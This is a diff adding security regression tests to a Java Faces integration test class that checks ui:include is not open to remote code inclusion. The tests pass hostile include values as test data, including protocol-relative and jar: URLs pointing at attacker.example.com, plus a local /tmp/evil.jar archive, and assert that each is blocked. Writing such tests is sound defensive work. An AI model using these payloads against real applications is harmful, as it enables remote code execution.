@@ -32,6 +32,7 @@ import ee.jakarta.tck.faces.util.selenium.WebPage;
 class UiIncludeRceIT extends BaseITNG {
 
     private static final String PAGE = "uiIncludeRce.xhtml";
+    private static final String JAR_PAGE = "jarParam.xhtml";
     private static final String WEB_XML_CONTENT = "<web-app";
     private static final String REMOTE_CONTENT = "support \"begin\" and \"end\"";
 
@@ -101,6 +102,38 @@ class UiIncludeRceIT extends BaseITNG {
     void testDataScheme() {
         var page = getPage(PAGE + "?p=data:text/xml,%3Chtml/%3E");
         assertBlocked(page);
+    }
+
+    @Test
+    void testProtocolRelative() {
+        var page = getPage(PAGE + "?p=//attacker.example.com/evil.xhtml");
+        assertBlocked(page);
+    }
+
+    // Includes from a Facelet which is itself served from a JAR.
+
+    @Test
+    void testJarHostedLocalInclude() {
+        var page = getPage(JAR_PAGE + "?p=jarLocal.xhtml");
+        assertTrue(page.containsText("safe from jar"));
+    }
+
+    /**
+     * A container which serves a JAR hosted Facelet under the {@code jar} scheme gives it a null authority, which must
+     * not let a remote archive pass as the archive the including Facelet itself lives in. Asserted on the guard's own
+     * message rather than through {@link #assertBlocked(WebPage, String...)}, because a rejected include and a failed
+     * attempt to fetch the remote archive both end up as an error page.
+     */
+    @Test
+    void testJarHostedRemoteArchive() {
+        var page = getPage(JAR_PAGE + "?p=jar:https://attacker.example.com/evil.jar!/evil.xhtml");
+        assertRejectedAsForeignOrigin(page);
+    }
+
+    @Test
+    void testJarHostedOtherLocalArchive() {
+        var page = getPage(JAR_PAGE + "?p=jar:file:///tmp/evil.jar!/evil.xhtml");
+        assertRejectedAsForeignOrigin(page);
     }
 
     // Path traversal variants.
@@ -173,6 +206,12 @@ class UiIncludeRceIT extends BaseITNG {
         for (String content : forbiddenContent) {
             assertFalse(page.getSource().contains(content), () -> "Must not disclose: " + content);
         }
+    }
+
+    private void assertRejectedAsForeignOrigin(WebPage page) {
+        assertTrue(
+            page.getSource().contains("must be a relative path within the application"),
+            () -> "Include should have been rejected before the archive was opened, but page source was: " + page.getSource());
     }
 
     private void assertNoStackTrace(WebPage page) {
